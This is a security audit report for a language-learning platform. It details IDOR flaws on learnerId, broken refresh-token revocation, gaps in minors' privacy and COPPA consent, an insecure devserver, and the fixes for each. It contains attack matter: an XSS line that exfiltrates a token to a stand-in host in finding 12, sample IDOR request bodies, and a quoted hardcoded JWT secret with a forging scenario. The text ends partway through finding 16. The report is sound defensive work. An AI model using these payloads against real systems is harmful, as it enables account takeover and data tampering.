# Russkiy Platform — Deep Security & Architecture Audit

_Method: 7 independent finder agents (auth/crypto, authz/multi-tenancy, SQL/data, API robustness, web client, privacy/COPPA, structure/config), each finding adversarially verified against the real code, then synthesized. 41 raw findings → 36 confirmed (5 refuted as false positives) + net-new items from a completeness-critic pass._

**Severity mix (confirmed):** 2 blocker · 7 high · 12 medium · 15 low

## Executive summary

The platform is functionally rich but has a systemic authorization failure that makes it unsafe to operate in its current state. The dominant theme is broken multi-tenancy: every learner-scoped write path that accepts a learnerId in the request body (session generate, session result submit, placement generate, placement submit) trusts that client-supplied id and never checks it against the authenticated caller, even though the correct pattern (verifySessionOwnership, ProfileHandler.Get) already exists elsewhere in the same codebase. The result is that any logged-in user can read and corrupt any other user's CEFR level, skill/mastery state, and sessions given only a discoverable profile UUID — two of these are outright blockers. The second systemic theme is a broken refresh-token lifecycle: rotation is keyed on the raw token string while logout revokes by jti, so logout and admin-triggered revocation silently do nothing, and rotation never consults a stored-token allowlist, so any unexpired signed refresh JWT is accepted for its full 30-day TTL — the refresh store provides no real security. A third theme is that privacy/COPPA guarantees are asserted in comments and migrations but not enforced in code: 13-17 teens (minors) are fully behaviorally tracked, parental consent lives only in the child's localStorage, and the analytics "no PII" invariant is defeated by unvalidated element labels and client-supplied meta. Rounding this out, several security controls fail open (Redis-backed lockout and rate limiting degrade to no protection on any Redis error), the access token is stored in JS-readable localStorage (nullifying the httpOnly-cookie design), and a fully insecure in-memory devserver (hardcoded HS256 secret, bcrypt.MinCost, no ownership checks) is buildable and deployable on the same port as production with nothing preventing it. The SQL/data-integrity and structure/config issues are individually lower-severity but reinforce the pattern: correctness invariants (idempotency, monotonic level, consent, retention) are enforced client-side or by convention rather than in the database or server. Bottom line: authentication crypto primitives (RS256, bcrypt) are reasonable, but the authorization layer and the privacy-enforcement layer are not trustworthy, and the platform should not handle real users — least of all minors — until the IDOR family and refresh-revocation gaps are closed.

## Posture by area

| Area | Rating | Notes |
|---|---|---|
| Authentication & crypto | **WEAK** | Primitives are sound (RS256 asymmetric signing, bcrypt.DefaultCost, RSA key from file), but the session lifecycle around them is broken: logout revokes by jti while rotation checks the raw token string, so revocation is a no-op; rotation enforces no stored-token allowlist, so any unexpired signed refresh JWT is accepted for 30 days; ValidateToken never checks token type/iss/aud, so a refresh token works as a bearer access token. Login leaks email-enumeration via bcrypt timing, and admin keys use non-constant-time == comparison. Insecure config defaults only warn instead of failing fast. |
| Authorization & multi-tenancy | **CRITICAL** | Systemic IDOR: session generate, session result submit, placement generate, and placement submit all trust a client-supplied learnerId with no ownership check against the authenticated caller, despite the correct verifySessionOwnership/ProfileHandler.Get pattern existing in the same package. Any authenticated user can read and overwrite another learner's CEFR level, FSRS skill state, and sessions from a discoverable profile UUID. Two are confirmed blockers. This is the single worst area. |
| SQL & data integrity | **WEAK** | Cross-tenant writes reach the DB unscoped (UpdateLevel/UpsertLearnerSkill WHERE id only). Session Complete is non-idempotent (double-counts XP/total_sessions on replay); concurrent result submits lose XP/index via read-modify-write with no locking; StreakStore.Get swallows all errors as zeroed stats, regressing a learner's stored level to 1 on a transient failure; PutProgress is a blind last-write-wins that lets an empty client clobber real progress; and FK ON DELETE semantics drift between migrations 001 and 012. Invariants that belong in SQL are enforced in Go or on the client. |
| API robustness | **WEAK** | Input validation is inconsistent: body-supplied learnerId is trusted for authorization decisions; analytics meta JSON is stored verbatim with no allowlist; LTI Launch echoes raw jwt library errors to unauthenticated callers (verification-path fingerprinting). The in-memory rate limiter never evicts expired windows (unbounded map growth on the degraded path). Body-size caps and time-budget clamps exist, so it is not uniformly bad, but the validation gaps line up with the authz gaps. |
| Web client | **WEAK** | The access token is written to localStorage, defeating the httpOnly-cookie XSS design the code comments claim — any XSS foothold exfiltrates a live bearer token. The placement page bypasses the same-origin /api proxy, hardcodes an http://localhost:8080 fallback (breaks/mixed-content on HTTPS), and reinforces the localStorage-token path. COPPA parental consent (with parent email PII) is stored only client-side. Cookie-auth mutating endpoints rely solely on SameSite=Lax with no Origin/CSRF check. |
| Privacy / COPPA | **CRITICAL** | Minor protection is incomplete and mostly aspirational. Teens (13-17), explicitly labeled minors in the signup UI, are fully behaviorally tracked because the suppression set is only {kid, toddler} on both client and server. Kid parental consent is a client-only localStorage checkbox, self-asserted and never persisted server-side — no auditable, verifiable, deletable consent record exists. The 'no PII' analytics guarantee is unenforced: element labels capture arbitrary DOM text (including other people's names) and client meta JSON is stored verbatim. There is no account-deletion/right-to-erasure endpoint and no retention purge. |
| Structure & config | **WEAK** | A self-contained insecure devserver (hardcoded HS256 secret 'dev-secret-change-in-production', no signing-method check so forged tokens are accepted, bcrypt.MinCost, no ownership checks, no hardening) is buildable with plain go build and listens on the same :8080 as prod with a launch.json entry — an operator mistake is a full auth bypass. Insecure prod defaults (default JWT_SECRET, sslmode=disable DATABASE_URL) only warn instead of failing fast. Per-user curriculum blob vs per-profile server state smears multi-profile users; downward re-placement diverges permanently between client and server. |

## Confirmed findings

### 1. [BLOCKER] Placement submit trusts client-supplied learnerId — overwrites another learner's CEFR level and skill states (IDOR write)
`services/api/internal/handler/placement.go:237` — _tenant-authz / authorization/idor_

**What:** POST /v1/placement/submit is JWT-protected (main.go:210) but SubmitPlacement takes req.LearnerID from the body and never checks it belongs to the caller. It calls h.profiles.GetByID(ctx, req.LearnerID) (placement.go:237, no ownership check), then h.profiles.UpdateLevel(ctx, req.LearnerID, determinedLevel) (placement.go:243) which unconditionally sets current_level on that profile (store/profile.go:77, UPDATE ... WHERE id=$1 with no user filter), re-initializes the victim's skills (placement.go:248) and upserts confidence/status onto the victim's learner_skills (placement.go:262). GeneratePlacement (placement.go:62) has the same missing check.

**Failure scenario:** Authenticated user A submits {"learnerId":"<victim B profile id>","results":[...],"stoppedStage":0} to /v1/placement/submit. The server rewrites B's current_level (e.g. forcing B back to A1) and clobbers B's learner_skills confidence/status — corrupting another user's placement and mastery data. UpdateLevel is not monotonic (unlike AdvanceLevelByUserID), so it can also downgrade B's level.

**Fix:** In BOTH GeneratePlacement (after the GetByID at placement.go:62) and SubmitPlacement (after the GetByID at placement.go:237), enforce ownership: `if profile.UserID.String() != middleware.GetUserID(ctx) { writeJSON(w, http.StatusForbidden, map[string]string{\"error\":\"access denied\"}); return }` — mirroring ProfileHandler.Get (profile.go:119-120). Add the `github.com/russkiy/api/internal/middleware` import. Preferably also resolve the learner profile from the JWT rather than trusting the body. Optionally make UpdateLevel monotonic to match AdvanceLevelByUserID as defense in depth, but the ownership check is the required fix.

### 2. [BLOCKER] Session generation trusts client-supplied learnerId — cross-user session creation, skill init, and content/PII read (IDOR)
`services/api/internal/handler/session.go:64` — _tenant-authz / authorization/idor_

**What:** POST /v1/sessions/generate is mounted under JWTAuth (main.go:213) but SessionHandler.Generate reads req.LearnerID straight from the request body and calls h.profiles.GetByID(ctx, req.LearnerID) (session.go:64) with NO check that the profile's UserID equals the authenticated caller. ProfileStore.GetByID (store/profile.go:32) fetches ANY profile by id with no user scoping. The handler then, against the victim's learner_id: reads their skills, may call InitializeSkills (session.go:89) writing rows into the victim's learner_skills, creates a session row keyed to the victim (session.go:152-165), writes session_items, and returns SessionWithItems including profile-derived content. Every other learner endpoint (stats, skills/me, history) resolves the learner from the JWT via ListByUserID, so this is the odd one out. Compare profile.Get (profile.go:119) which DOES enforce profile.UserID==userID.

**Failure scenario:** Any authenticated learner A enumerates or guesses learner B's profile UUID (e.g. leaked via leaderboard/report responses or sequential-ish ids) and POSTs {"learnerId":"<B>","timeBudgetMinutes":30} to /v1/sessions/generate. The server creates sessions and initializes/mutates B's learner_skills and returns B's adaptive content selection — a cross-user write and read with only a valid login required.

**Fix:** In Generate, resolve the caller and reject cross-user access. After GetByID succeeds, add: `userID := middleware.GetUserID(ctx); uid, err := uuid.Parse(userID); if err != nil || profile.UserID != uid { writeJSON(w, http.StatusForbidden, map[string]string{"error": "access denied"}); return }` — mirroring verifySessionOwnership/ProfileHandler.Get. Better and simpler: ignore req.LearnerID entirely and derive the learner profile from the JWT via h.profiles.ListByUserID(ctx, uid)[0].ID, exactly as History does, so the body can never target another user's learner_id.

### 3. [HIGH] Refresh-token rotation does not enforce the stored-token allowlist, so any unexpired refresh JWT is accepted
`services/api/internal/auth/auth.go:208` — _auth-crypto / session-management_

**What:** RotateRefreshToken only (a) verifies the RS256 signature/expiry and (b) checks IsRevoked. It never checks that the token was ever issued/stored (StoreRefreshToken is write-only for the store's 'tokens' map and is never read during rotation). Because access and refresh tokens are signed with the SAME RSA key and TokenClaims-vs-RegisteredClaims parsing is lenient, and because revocation keying is broken (see separate finding), rotation accepts a refresh token purely on signature validity.

**Failure scenario:** Given any still-valid refresh token (e.g. one that was 'revoked' at logout, or one an attacker replayed), rotation succeeds and issues a new pair, indefinitely re-extending the session every 30 days. There is no server-side allowlist gate that could stop a leaked-but-signed token, defeating the purpose of a refresh-token store.

**Fix:** Add a read method to the auth.TokenStore interface, e.g. GetRefreshToken(tokenID string) (userID string, ok bool), and implement it in both MemoryTokenStore (read s.tokens) and redisstore.TokenStore (GET rt:store:<tokenID>). Key everything consistently on the token's jti (claims.ID), not the raw token string: in generateTokens/OAuth/LTI store with StoreRefreshToken(claims.ID_of_new_token, userID); in RotateRefreshToken set tokenID := claims.ID, and after signature validation require GetRefreshToken(claims.ID) to return ok==true AND userID==claims.Subject before rotating (reject with ErrInvalidToken when absent = never issued or already rotated); on successful rotation delete/revoke the old jti and StoreRefreshToken the new token's jti. Also fix Logout to revoke by the same key (claims.ID) so revocation and rotation agree. This turns the store into a real allowlist and makes logout/leak revocation effective.

### 4. [HIGH] Teen (13-17) minors are fully tracked — minor-suppression only covers kid/toddler
`services/api/internal/handler/analytics.go:33` — _privacy-coppa / privacy-minors_

**What:** The signup UI (apps/web/src/app/(auth)/signup/page.tsx:26) offers a `teen` segment explicitly labeled "Teen (13-17)" — i.e. minors, and a range that overlaps under-13 at age 13. But the minor-exclusion set is only `{kid, toddler}` in BOTH the server backstop (services/api/internal/handler/analytics.go:33 `minorSegments`) and the client (apps/web/src/lib/analytics.ts:15 `MINOR_SEGMENTS`). As a result, a 13-17-year-old's behavioral events — every click coordinate, route, dwell time, task funnel, and session boundary — are captured client-side and persisted server-side into `analytics_events`. The product/privacy rule is that minors must never have product-analytics stored; teens are minors, so this violates it for the entire 13-17 cohort (and any age-13 under-13 who selects teen).

**Failure scenario:** A 15-year-old signs up and picks the "Teen (13-17)" card. `enabled()` returns true (teen is not in MINOR_SEGMENTS), the dashboard layout calls analytics.init(), and the child's clicks/routes/dwell/session data stream to POST /v1/analytics/events. The server's `minorSegments` check passes them through and InsertBatch writes a minor's behavioral profile to the DB.

**Fix:** Prefer an adult-only allowlist so any minor-ish segment fails closed by default. Server (services/api/internal/handler/analytics.go): replace the minorSegments denylist with an allowlist, e.g. `var adultSegments = map[string]bool{"migrant": true, "senior": true, "uni_prep": true, "professional": true, "daily_life": true}` and change the check at line 76 to `if segErr != nil || !adultSegments[segment] { w.WriteHeader(http.StatusNoContent); return }`. Client (apps/web/src/lib/analytics.ts): mirror with an `ADULT_SEGMENTS` set and change `enabled()` (line 52) to `return ADULT_SEGMENTS.has(auth.getSegment() || "")`. As a minimal stopgap (if keeping the denylist), add `"teen"` (and `"toddler"`) to both `minorSegments` (analytics.go:33) and `MINOR_SEGMENTS` (analytics.ts:15). Also correct the now-inaccurate comments in services/api/migrations/015_analytics.sql:6-8 and the analytics.ts:5-6 header, and consider a one-off DELETE of any already-captured rows where segment IN ('teen','toddler') from analytics_events.

### 5. [HIGH] Logout never revokes the refresh token (revocation keyspace mismatch)
`services/api/internal/handler/auth.go:218` — _auth-crypto / session-management_

**What:** Refresh tokens are stored and checked for revocation keyed by the RAW token string everywhere except Logout. generateTokens() calls StoreRefreshToken(refreshStr, userID) with the raw JWT string (auth.go:240); RotateRefreshToken sets tokenID := oldTokenStr and does IsRevoked(rawToken)/RevokeRefreshToken(rawToken) (auth.go:221-230). But Logout calls h.tokenStore.RevokeRefreshToken(claims.ID) — the jti UUID (handler/auth.go:218). In Redis these become two different keys: 'rt:revoked:<rawJWT>' vs 'rt:revoked:<jti>'. So Logout writes a revocation record that the refresh path never consults.

**Failure scenario:** A user logs out (or an admin/help-desk triggers logout after a token is suspected stolen). The server writes rt:revoked:<jti>. An attacker who captured the refresh token then POSTs it to /v1/auth/refresh; RotateRefreshToken checks IsRevoked(rawToken) which is NOT set, so rotation succeeds and mints a fresh access+refresh pair. The logged-out/stolen token remains fully usable for the entire 30-day refresh TTL. Logout provides no security.

**Fix:** Key the entire refresh-token lifecycle on one consistent identifier — the jti — so Logout's revocation is actually consulted by Refresh.

1. In auth.go RotateRefreshToken (services/api/internal/auth/auth.go:221): instead of tokenID := oldTokenStr, use the parsed jti: tokenID := claims.ID (claims is already a *jwt.RegisteredClaims, so claims.ID holds the jti). Use that jti for IsRevoked/RecordRevokedReuse/RevokeRefreshToken (lines 224-230).
2. When storing the newly minted refresh token in RotateRefreshToken (line 246-247), parse its jti (or have GenerateRefreshToken return the jti) and store by jti, not by the raw string: newRefreshID := <jti of newRefresh>; store.StoreRefreshToken(newRefreshID, userID).
3. In handler/auth.go generateTokens (line 240) and lti.go:180, likewise store by the refresh token's jti rather than the raw string. The simplest robust approach is to have GenerateRefreshToken also return the jti (e.g. change its signature to (tokenStr, jti string, err error)) and pass that jti to StoreRefreshToken everywhere.
4. Logout (handler/auth.go:218) already uses claims.ID (jti) — it becomes correct once the store/rotate paths key on jti.

After this change, Logout writes rt:revoked:<jti> and Refresh checks rt:revoked:<jti>, so logout (and any admin-triggered revocation) actually blocks subsequent refreshes. Add a regression test that logs out then attempts refresh and asserts token_revoked.

### 6. [HIGH] Placement submit writes CEFR level and skill state to an attacker-chosen profile (cross-tenant write)
`services/api/internal/handler/placement.go:243` — _sql-data / authorization / data integrity_

**What:** SubmitPlacement (authenticated route POST /v1/placement/submit, registered in cmd/server/main.go:210) reads the target profile id from the request body field learnerId (req.LearnerID) and never verifies that profile belongs to the authenticated caller. It then calls profiles.UpdateLevel (store/profile.go:77 -> UPDATE learner_profiles SET current_level=$2 WHERE id=$1), skills.InitializeSkills, and skills.UpsertLearnerSkill against that id. GetByID only checks the profile exists, not ownership. There is no GetUserID/ownership check anywhere in the handler.

**Failure scenario:** Any logged-in user (learner A) sends POST /v1/placement/submit with {"learnerId":"<victim profile UUID>", ...} and arbitrary results. The server overwrites victim B's current_level (e.g. resets a C1 learner to A1) and rewrites/initializes B's learner_skills confidences. This is a direct cross-tenant write that corrupts another user's progress data and CEFR level, and can be used to grief every profile whose UUID is discoverable (leaderboard/teacher search expose profile ids).

**Fix:** In SubmitPlacement, resolve the caller: `userID := middleware.GetUserID(ctx)`, then after GetByID reject cross-tenant access with `if profile.UserID.String() != userID { writeJSON(w, http.StatusForbidden, ...); return }` BEFORE any UpdateLevel/InitializeSkills/UpsertLearnerSkill call. (The same missing ownership check also affects GeneratePlacement at placement.go:62, which currently lets any authenticated user read another profile's segment — apply the identical guard there.)

### 7. [HIGH] SubmitPlacement trusts client-supplied learnerId with no ownership check — cross-tenant write of profile level + skill states
`services/api/internal/handler/placement.go:196` — _api-robustness / input-validation_

**What:** SubmitPlacement decodes `req.LearnerID` straight from the JSON body and then writes to that learner: h.profiles.UpdateLevel(ctx, req.LearnerID, ...), h.skills.InitializeSkills(ctx, req.LearnerID, ...), and per-result h.skills.UpsertLearnerSkill(ctx, req.LearnerID, ...). There is no comparison against middleware.GetUserID(r.Context()) / the profile's UserID (unlike SessionHandler.verifySessionOwnership). The route is only behind JWTAuth, so any authenticated user can target any other learner's profileID. GetProgress/PutProgress and the session ownership checks prove the app derives the caller's identity from the token elsewhere — here it is ignored.

**Failure scenario:** Attacker registers, creates a profile, obtains a valid JWT, then POSTs /v1/placement/submit with `{"learnerId":"<victim-profile-uuid>","results":[...],"stoppedStage":0}`. The server overwrites the victim's current_level (UpdateLevel), re-initializes their skill states (InitializeSkills wipes/reseeds), and upserts confidence=0.5 skill rows — corrupting/resetting another tenant's learning data and CEFR level.

**Fix:** In SubmitPlacement, after fetching the profile (line 237-241), reject callers who do not own it. Mirror verifySessionOwnership: uid, err := uuid.Parse(middleware.GetUserID(r.Context())); if err != nil || uid == uuid.Nil { writeJSON(w, http.StatusUnauthorized, ...); return }; then after loading profile, if profile.UserID != uid { writeJSON(w, http.StatusForbidden, map[string]string{"error":"forbidden"}); return }. Add the "github.com/russkiy/api/internal/middleware" import. Perform this check BEFORE any UpdateLevel/InitializeSkills/UpsertLearnerSkill write. Apply the same ownership check to GeneratePlacement (line 62) for defense in depth.

### 8. [HIGH] Session submit writes FSRS skill state to the body-supplied result.LearnerID, not the owned session's learner — cross-user mastery corruption
`services/api/internal/handler/session.go:294` — _tenant-authz / authorization/idor_

**What:** Submit verifies the SESSION belongs to the caller (verifySessionOwnership, session.go:262) but then uses result.LearnerID — an attacker-controlled field decoded from the request body (model.ExerciseResult.LearnerID, model/session.go:78) — for the skill update: h.skills.GetLearnerSkill(ctx, result.LearnerID, skillID) (session.go:294) and h.skills.UpsertLearnerSkill(ctx, result.LearnerID, learnerSkill) (session.go:303). SkillStore.UpsertLearnerSkill (store/skill.go:100) upserts on (learner_id, skill_id) with no scoping to the session, so the write lands on whatever learner_id the body says. session.LearnerID (already validated) is ignored for the skill write.

**Failure scenario:** Authenticated user A creates a legitimate session S they own, then POSTs a result to /v1/sessions/{S}/submit with body {"contentId":"<known atom>","learnerId":"<victim B profile id>","isCorrect":false,...}. Ownership passes (S is A's), but the FSRS update degrades/overwrites B's learner_skills row for the atom's skill — corrupting another learner's mastery/confidence and review schedule.

**Fix:** Immediately after the ownership check passes (session.go:265), pin the learner to the validated session value: add `result.LearnerID = session.LearnerID`. This makes the FSRS get/upsert (session.go:294, 303), the streak lookup (session.go:310), and the persisted ExerciseResult all key off the ownership-validated learner, so the body-supplied learnerId is ignored. No changes to the store layer are required.

### 9. [HIGH] SessionHandler.Generate trusts client-supplied learnerId with no ownership check — cross-tenant read/write of another learner's session
`services/api/internal/handler/session.go:46` — _api-robustness / input-validation_

**What:** Generate reads `req.LearnerID` from the body and uses it for every downstream call (profiles.GetByID, skills.GetDueForReview/GetWeakest/InitializeSkills, sessions.Create with LearnerID=req.LearnerID, content.GetRecentlyUsed). No check that req.LearnerID's profile.UserID == the authenticated user. GetState/Submit/Complete all call verifySessionOwnership, but Generate — which creates the session and can InitializeSkills for an arbitrary learner — does not.

**Failure scenario:** Authenticated attacker POSTs /v1/sessions/generate with `{"learnerId":"<victim-profile-uuid>"}`. The server creates a session bound to the victim, may call skills.InitializeSkills on the victim's profile if they have no skills yet, and returns the victim's due/weak-skill-derived content set — leaking which skills the victim is weak on and mutating their skill state.

**Fix:** In Generate, after decoding req and before using req.LearnerID, enforce that the caller owns that profile — mirror verifySessionOwnership. Concretely, after loading `profile` at line 64: resolve the authenticated user via `userID := middleware.GetUserID(ctx)`; parse it `uid, err := uuid.Parse(userID)`; and require `profile.UserID == uid`, returning `writeJSON(w, http.StatusForbidden, map[string]string{"error":"access denied"})` and `return` otherwise. (Equivalently: load the caller's profiles via profiles.ListByUserID(ctx, uid) and require req.LearnerID to be among them.) This blocks the cross-tenant session creation, skill initialization, and weak-skill leak while leaving the legitimate self-service path intact.

### 10. [MEDIUM] kid_consent 'parental consent' is a client-only checkbox never recorded server-side
`apps/web/src/app/(auth)/signup/page.tsx:103` — _privacy-coppa / coppa-consent_

**What:** For the `kid` segment, the only consent artifact is `localStorage.setItem("kid_consent", JSON.stringify({ at, by: email }))` on the child's own browser. It is (a) a mere checkbox, not verifiable parental consent; (b) self-asserted `by: email` with no verification that the email belongs to a parent; (c) stored only in the child's localStorage — it is NEVER transmitted to the API, so there is no server-side, auditable consent record; (d) trivially cleared by `auth.clear()` (which wipes all keys) or by the browser. The api.createProfile call sends only displayName/segment/targetLevel/weeklyHours — no consent field. There is no server table or column capturing consent. The code comment and docs/production-readiness.md:93-103 both acknowledge this is not COPPA-compliant, yet self-serve kid signup ships. This means under-13 accounts are created and then TRACKED-excluded, but the platform holds children's PII (nickname, learning data, progress) with no compliant consent basis and no record to prove consent was ever given.

**Failure scenario:** A 10-year-old completes kid signup, ticks the box, and an account with the child's nickname + full learning history is created on the backend. No consent record exists on the server. On a COPPA/GDPR-K audit or a parent's deletion/access request, there is no way to prove verifiable parental consent was obtained, and the 'consent' evidence lives only in a localStorage key that has likely been cleared.

**Fix:** Do not self-serve provision under-13 accounts on a client checkbox. Minimum viable fix: (1) add a server-side consent record — a consents table/column tied to the user capturing method, parent email, and timestamp — and have createProfile (or a dedicated /v1/consents endpoint) persist it transactionally with profile creation for the kid segment; stop relying on localStorage (which auth.clear() at signup/page.tsx:114 immediately wipes). (2) Implement genuine verifiable parental consent (parent-account model where the adult is the account holder, signed form, or nominal auth charge) before the kid account is created, and (3) provide documented deletion/access paths. Until (2) exists, gate the kid segment behind a parent account or disable self-serve kid signup, as docs/production-readiness.md:101-102 recommends.

### 11. [MEDIUM] Analytics 'element' label captures arbitrary DOM text (aria-label / textContent), can hold PII
`apps/web/src/lib/analytics.ts:116` — _privacy-coppa / pii-analytics_

**What:** labelFor() derives the stored `element` value from a data-analytics attribute, else the nearest a/button/[role=button]'s `aria-label`, else its trimmed `textContent` (first 60 chars), and the server further truncates to 120 (analytics.go:92). Migration 015 and multiple comments assert 'no free text / PII', but there is no allowlist — any clickable element's visible text is captured verbatim. Dashboard pages render personal data inside clickable elements (e.g. learner/student display names on leaderboard and teacher student pages, a user's own name/initials button in the sidebar, search-result rows containing names). When an adult learner or teacher clicks such an element, that name/label — potentially another person's name (a classmate, a student) — is stored in analytics_events.element against the clicker's user_id. The 'no PII' guarantee is documented but not enforced by the extractor.

**Failure scenario:** A teacher (or adult learner) clicks a student's name button on the leaderboard/roster; labelFor() returns the student's display name via textContent, it is stored in analytics_events.element. The heatmap/route dashboards and any raw table dump now contain personal names the platform promised not to collect.

**Fix:** In apps/web/src/lib/analytics.ts labelFor(), drop the aria-label and textContent fallbacks so a label is only recorded when an explicit data-analytics attribute is present; otherwise return the element's tagName (or a controlled role token). Concretely, remove lines 116-122 (the `el.closest("a,button,[role=button]")` block that returns aria-label/textContent) and fall straight through to `return el.tagName.toLowerCase();`. As defense-in-depth, add a server-side allowlist/length guard in handler/analytics.go so unexpected free-text element values are dropped rather than stored, and update the "no PII" comments to reflect that only data-analytics-tagged labels are captured.

### 12. [MEDIUM] Access token is persisted in localStorage, defeating the httpOnly-cookie XSS protection
`apps/web/src/lib/auth.ts:56` — _web-client / auth/token-exposure_

**What:** auth.setTokens() writes the JWT access token to window.localStorage under the key 'access_token' (auth.ts:52-57). Both the login page (login/page.tsx:24 -> auth.setTokens(tokens.accessToken)) and signup page (signup/page.tsx:118) call it, and the placement flow reads it straight back out of localStorage to build an Authorization: Bearer header (placement/page.tsx:99,111 and 227). api.ts:344 also reads it via auth.getAccessToken() and sends it as a Bearer header on every request. The whole cookie design comment ('tokens never touch JavaScript … XSS can't exfiltrate it', auth.ts:52-56, authcookies.go:11-15) is therefore false in practice: the short-lived access token IS in JS-readable storage. The refresh token is correctly cookie-only, but the access token is not.

**Failure scenario:** Any XSS foothold on the web origin (a malicious/compromised npm dependency, a stored-content injection, a browser-extension supply-chain issue) can run `fetch('https://evil/x?t='+localStorage.access_token)` and exfiltrate a live access token. Unlike the httpOnly cookie (which cannot be read by JS and cannot be replayed off-origin), the stolen Bearer token authenticates the victim from anywhere until it expires — the attacker impersonates the user (including a teacher/dean/admin) from their own machine for the token TTL.

**Fix:** Stop persisting the access token in JS-readable storage. In auth.ts, do not write the access token to localStorage in setTokens(); instead keep it in a module-level in-memory variable for the mobile/Bearer path, and store only a non-sensitive boolean flag (e.g. is_authenticated="true") in localStorage to drive isAuthenticated()/nav. getAccessToken() returns the in-memory value (null after reload on web, which is fine because the httpOnly cookie authenticates same-origin requests). api.ts already sends credentials:'include', so same-origin /api proxy calls stay authenticated via the httpOnly access_token cookie with no Bearer header. Refactor placement/page.tsx to call through the same /api proxy with credentials:'include' (drop the localStorage.getItem("access_token") + manual Authorization: Bearer at lines 99/111/227/241). For getRole()'s JWT decode, source the role from a server /me endpoint or a decoded-claims object held in memory rather than re-reading the raw token from localStorage. Also add access_token/refresh_token to ALL_KEYS cleanup is already present; ensure no other module reads localStorage access_token.

### 13. [MEDIUM] Dev in-memory server (cmd/devserver) is production-deployable and bypasses all auth/security controls
`services/api/cmd/devserver/main.go:24` — _structure-config / config/structural_

**What:** cmd/devserver/main.go is a full, self-contained HTTP API that duplicates auth/profiles/sessions but with none of the production hardening the real server (cmd/server/main.go) has: it signs JWTs with a hardcoded HS256 secret `const jwtSecret = "dev-secret-change-in-production"` (line 24) that anyone reading the repo can forge; its jwtAuth (line 403) never verifies the signing method, so a forged HS256 token for ANY sub is accepted; it hashes passwords with `bcrypt.MinCost` (line 519); it applies no SecurityHeaders, no MaxBodySize, no per-user rate limiter, no account lockout, no request Timeout, and has no /readyz. It listens on port 8080 — the SAME port the real server uses (config default PORT=8080) — and `.claude/launch.json` defines a "Go Dev API" entry (`go run ./cmd/devserver`, port 8080). Nothing (no build tag, no ENVIRONMENT guard, no distinct port) prevents this binary from being built and shipped in place of cmd/server. Because it accepts forged tokens and every /profiles, /sessions, /stats route is behind only jwtAuth, deploying it is a full auth bypass.

**Failure scenario:** An operator (or a Dockerfile/CI job that references ./cmd/devserver, mirroring launch.json) builds and deploys devserver to prod on :8080. An attacker mints an HS256 token signed with the public constant `dev-secret-change-in-production` for any sub/UUID and reads or writes any learner's profile, stats and session data — no password, no lockout, no rate limit.

**Fix:** Add a build tag to cmd/devserver/main.go (`//go:build devserver` as the first line) so it is excluded from default `go build ./...`, AND/OR hard-refuse to start unless an explicit dev env is set (e.g. `if os.Getenv("ENVIRONMENT") != "development" { log.Fatal("devserver refuses to run outside development") }` at the top of main()). Also change its default port off 8080 (e.g. 8099) and update/remove the "Go Dev API" launch.json entry so it can never be confused with the prod server. As defense-in-depth, make jwtAuth reject non-HMAC signing methods, but the primary fix is preventing the binary from being buildable/deployable as prod.

### 14. [MEDIUM] Login is vulnerable to user (email) enumeration via timing and control-flow divergence
`services/api/internal/handler/auth.go:103` — _auth-crypto / authentication_

**What:** Login does GetByEmail first; if the email is unknown it returns 401 immediately with NO bcrypt comparison (auth.go:103-107). For a known email it always runs the (deliberately slow) bcrypt VerifyPassword. The presence/absence of the ~50-100ms bcrypt delay is a reliable oracle for whether an email is registered. The lockout is keyed on user.ID.String(), so it only exists after a successful email lookup — unknown emails are never rate-limited by the lockout path at all.

**Failure scenario:** An attacker submits login requests for a list of candidate emails and measures response latency: registered accounts respond markedly slower (bcrypt runs) than unregistered ones (early 401). This enumerates which emails have accounts — useful for targeted phishing/credential-stuffing — and the enumeration itself is not throttled by account lockout since no userID exists for unknown emails.

**Fix:** Two-part fix. (1) Equalize timing/control-flow: on unknown email (auth.go:104-107) do NOT early-return; instead run a dummy bcrypt compare against a precomputed VALID bcrypt hash at the same cost (bcrypt.DefaultCost), e.g. a package-level dummyHash := must(bcrypt.GenerateFromPassword([]byte("timing-equalizer"), bcrypt.DefaultCost)); call bcrypt.CompareHashAndPassword([]byte(dummyHash), []byte(req.Password)) so the code path spends comparable time, then return the same generic 401 'invalid credentials'. (A malformed/empty hash short-circuits instantly, so the dummy MUST be a real bcrypt hash.) (2) Add anonymous throttling on the login endpoint that runs BEFORE the DB lookup: apply an IP-scoped (and/or submitted-email-scoped) rate limiter to /v1/auth/register and /v1/auth/token in cmd/server/main.go — the existing per-user limiter cannot help because it keys on the JWT userID and no-ops for unauthenticated requests. Redis-backed fixed-window keyed on RealIP is sufficient.

### 15. [MEDIUM] GeneratePlacement trusts client-supplied learnerId with no ownership check — cross-tenant profile probe
`services/api/internal/handler/placement.go:51` — _api-robustness / input-validation_

**What:** GeneratePlacement decodes `req.LearnerID` from the body and calls h.profiles.GetByID(ctx, req.LearnerID) and logs profile.Segment for that learner, with no check that the profile belongs to the caller. While the returned items are content atoms (not directly PII), it confirms existence of an arbitrary profileID (200 vs 400 'learner profile not found') and is the read-side counterpart to the SubmitPlacement write hole.

**Failure scenario:** Authenticated attacker enumerates profile UUIDs via POST /v1/placement/generate; a 200 response (vs 400) reveals which UUIDs are valid learner profiles, and the server-side log records another tenant's segment. Combined with SubmitPlacement this becomes a full read+write on foreign profiles.

**Fix:** In GeneratePlacement, after loading the profile, enforce ownership before using it. Parse the authenticated user id and reject on mismatch:

    ctx := r.Context()
    profile, err := h.profiles.GetByID(ctx, req.LearnerID)
    if err != nil || profile == nil {
        writeJSON(w, http.StatusBadRequest, map[string]string{"error": "learner profile not found"})
        return
    }
    uid, perr := uuid.Parse(middleware.GetUserID(ctx))
    if perr != nil || profile.UserID != uid {
        writeJSON(w, http.StatusForbidden, map[string]string{"error": "forbidden"})
        return
    }

This mirrors verifySessionOwnership (handler/session.go:449). To also close the existence oracle, return the same 403/404 for both not-found and not-owned so the two cases are indistinguishable. Apply the identical ownership guard to SubmitPlacement (placement.go:196-241), which is the higher-severity write-side counterpart.

### 16. [MEDIUM] Session Complete has no idempotency guard: repeated calls double-count XP and total_sessions
`services/api/internal/handler/session.go:378` — _sql-data / data integrity / TOCTOU_

**What:** Complete() calls CompleteSession (UPDATE sessions SET status='completed', ... WHERE id=$1 — no status filter) and then unconditionally streaks.RecordActivity(session.LearnerID, session.TotalXP). RecordActivity (store/streak.go:53) does total_sessions = total_sessions + 1 and total_xp = total_xp + $3 on every call. Nothing checks whether session.Status is already 'completed', and CompleteSession's WHERE clause does not require status <> 'completed', so the write always succeeds.

